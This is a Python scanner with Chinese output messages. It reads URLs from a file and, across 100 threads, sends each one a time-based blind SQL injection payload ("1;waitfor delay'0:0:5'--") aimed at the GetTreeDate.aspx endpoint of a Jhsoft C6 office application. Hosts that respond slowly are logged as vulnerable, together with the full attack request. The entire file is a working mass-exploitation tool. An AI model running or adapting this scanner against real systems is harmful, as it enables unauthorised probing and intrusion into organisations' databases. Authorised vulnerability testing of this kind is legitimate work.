import requests
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def check_sql_injection(url):
    try:
        if url.endswith('/'):
            target_url = url + "c6/Jhsoft.Web.Appraise/GetTreeDate.aspx/?id=1;waitfor delay'0:0:5'--"
        else:
            target_url = url + "/c6/Jhsoft.Web.Appraise/GetTreeDate.aspx/?id=1;waitfor delay'0:0:5'--"
        start_time = time.time()
        response = requests.get(
            target_url,
            verify=False,
            allow_redirects=False,
            timeout=15  
        )
        response_time = time.time() - start_time
        status_code = response.status_code
        
        if 300 <= status_code < 400:
            print(f"[INFO] URL: {url} - 状态码: {status_code} (重定向)，漏洞不存在")
            return False, url, status_code, response_time
        
        elif status_code == 200 and response_time > 5:
            print(f"[+] 发现漏洞: {url}")
            return True, url, status_code, response_time
        
        else:
            print(f"[INFO] URL: {url} - 状态码: {status_code}, 响应时间: {response_time:.2f}秒，漏洞不存在")
            return False, url, status_code, response_time
            
    except requests.exceptions.Timeout:
        print(f"[ERROR] URL: {url} - 请求超时")
        return False, url, "Timeout", 0
        
    except requests.exceptions.ConnectionError:
        print(f"[ERROR] URL: {url} - 连接错误")
        return False, url, "ConnectionError", 0
        
    except Exception as e:
        print(f"[ERROR] URL: {url} - 发生错误: {str(e)}")
        return False, url, f"Error: {str(e)}", 0

def main():
    try:
        with open('url.txt', 'r', encoding='utf-8') as f:
            urls = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print("[ERROR] 未找到url.txt文件")
        return
    except Exception as e:
        print(f"[ERROR] 读取url.txt文件时发生错误: {str(e)}")
        return
    
    if not urls:
        print("[INFO] url.txt文件中没有有效的URL")
        return
    
    print(f"[INFO] 共读取到 {len(urls)} 个URL，开始检测...")
    print("[INFO] 线程数: 100")
    print("[INFO] 注意: 参数将直接拼接到URL中，不进行编码")
    print("-" * 50)
    
    vulnerable_count = 0
    results = []
    with ThreadPoolExecutor(max_workers=100) as executor:
        future_to_url = {executor.submit(check_sql_injection, url): url for url in urls}
        for future in as_completed(future_to_url):
            url = future_to_url[future]
            try:
                is_vulnerable, checked_url, status_code, response_time = future.result()
                
                if is_vulnerable:
                    vulnerable_count += 1
                    results.append({
                        'url': checked_url,
                        'status_code': status_code,
                        'response_time': response_time,
                        'payload': "1;waitfor delay'0:0:5'--"
                    })
                    
            except Exception as e:
                print(f"[ERROR] 处理URL {url} 时发生异常: {str(e)}")
    if results:
        try:
            with open('result.txt', 'w', encoding='utf-8') as f:
                f.write("SQL时间盲洞检测结果\n")
                f.write("=" * 50 + "\n")
                f.write(f"检测时间: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"总URL数量: {len(urls)}\n")
                f.write(f"发现漏洞数量: {vulnerable_count}\n")
                f.write("使用的Payload: 1;waitfor delay'0:0:5'--\n")
                f.write("=" * 50 + "\n\n")
                
                for i, result in enumerate(results, 1):
                    f.write(f"漏洞 #{i}:\n")
                    f.write(f"  URL: {result['url']}\n")
                    f.write(f"  完整请求: {result['url']}/c6/Jhsoft.Web.Appraise/GetTreeDate.aspx/?id={result['payload']}\n")
                    f.write(f"  状态码: {result['status_code']}\n")
                    f.write(f"  响应时间: {result['response_time']:.2f}秒\n")
                    f.write("-" * 50 + "\n")
            
            print(f"\n[SUCCESS] 检测完成！共发现 {vulnerable_count} 个漏洞，结果已保存到 result.txt")
            
        except Exception as e:
            print(f"[ERROR] 写入结果文件时发生错误: {str(e)}")
    else:
        print(f"\n[INFO] 检测完成！未发现任何漏洞")

if __name__ == "__main__":
    main()